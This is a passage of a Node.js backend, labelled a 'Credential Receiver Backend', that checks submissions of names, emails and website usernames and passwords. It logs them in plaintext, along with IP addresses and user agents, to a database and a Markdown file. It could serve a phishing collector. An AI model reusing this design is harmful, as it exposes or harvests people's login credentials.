/** Get real client IP, accounting for proxies */
function getClientIP(req) {
  return (
    req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
    req.headers["x-real-ip"] ||
    req.socket?.remoteAddress ||
    "unknown"
  );
}

/** Append a single entry block to the Markdown file */
function appendToMarkdown(entry) {
  try {
    const isNew = !fs.existsSync(MD_FILE);

    // Write file header once
    if (isNew) {
      const header = [
        "# Credential Submissions",
        "",
        "> Auto-generated by the Credential Receiver Backend.",
        `> Created: ${new Date().toISOString()}`,
        "",
        "---",
        "",
      ].join("\n");
      fs.writeFileSync(MD_FILE, header, "utf-8");
    }

    const block = formatMarkdownEntry(entry);
    fs.appendFileSync(MD_FILE, block, "utf-8");
  } catch (err) {
    console.warn("Could not write to local markdown file (likely read-only serverless filesystem):", err.message);
  }
}

/** Format a single entry as a Markdown block */
function formatMarkdownEntry(entry) {
  return [
    `## Entry — ${entry.id}`,
    "",
    `**Received:** ${entry.metadata.timestamp}`,
    "",
    "### 👤 Credential Details",
    "",
    "| Field        | Value                          |",
    "|--------------|--------------------------------|",
    `| Name         | ${entry.name}                  |`,
    `| Email        | ${entry.email}                 |`,
    `| Website User | ${entry.website_user}          |`,
    `| Website Pass | ${entry.website_pass}          |`,
    `| Dialogue     | ${entry.dialogue || "N/A"}     |`,
    "",
    "### 🌐 Metadata",
    "",
    "| Field         | Value                          |",
    "|---------------|--------------------------------|",
    `| ID            | ${entry.id}                    |`,
    `| IP Address    | ${entry.metadata.ip}           |`,
    `| User-Agent    | ${entry.metadata.user_agent}   |`,
    `| Timestamp     | ${entry.metadata.timestamp}    |`,
    `| ISO Timestamp | ${entry.metadata.iso}          |`,
    `| Source        | ${entry.metadata.source || "API"}        |`,
    "",
    "---",
    "",
  ].join("\n");
}

/** Rebuild the markdown file completely from database records */
async function rebuildMarkdown() {
  try {
    const res = await pool.query("SELECT * FROM credentials ORDER BY iso ASC");
    try {
      if (fs.existsSync(MD_FILE)) {
        fs.unlinkSync(MD_FILE);
      }

      // Write file header
      const header = [
        "# Credential Submissions",
        "",
        "> Auto-generated by the Credential Receiver Backend.",
        `> Created: ${new Date().toISOString()}`,
        "",
        "---",
        "",
      ].join("\n");
      fs.writeFileSync(MD_FILE, header, "utf-8");

      for (const row of res.rows) {
        const entry = {
          id: row.id,
          name: row.name,
          email: row.email,
          website_user: row.website_user,
          website_pass: row.website_pass,
          dialogue: row.dialogue || "",
          metadata: {
            ip: row.ip,
            user_agent: row.user_agent,
            timestamp: row.timestamp,
            iso: row.iso,
            source: row.source,
          },
        };
        const block = formatMarkdownEntry(entry);
        fs.appendFileSync(MD_FILE, block, "utf-8");
      }
      console.log(`Successfully rebuilt Markdown file: ${MD_FILE}`);
    } catch (fsErr) {
      console.warn("Could not write to local markdown file (likely read-only serverless filesystem):", fsErr.message);
    }
  } catch (err) {
    console.error("Error rebuilding markdown database query:", err);
  }
}

/** Validate incoming payload */
function validatePayload(body) {
  const required = ["name", "email", "website_user", "website_pass"];
  const missing = required.filter((f) => !body[f] || !String(body[f]).trim());

  if (missing.length > 0) {
    return { valid: false, message: `Missing required fields: ${missing.join(", ")}` };
  }

  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!emailRegex.test(body.email)) {
    return { valid: false, message: "Invalid email address format" };
  }

  return { valid: true };
}

// ============================================================================
// MIDDLEWARE — API Key Auth (optional, protects write endpoints)
// ============================================================================

function requireApiKey(req, res, next) {
  const key = req.headers["x-api-key"];
  if (!key || key !== API_KEY) {
    return res.status(401).json({ error: "Unauthorized: invalid or missing X-Api-Key header" });
  }
  next();
}

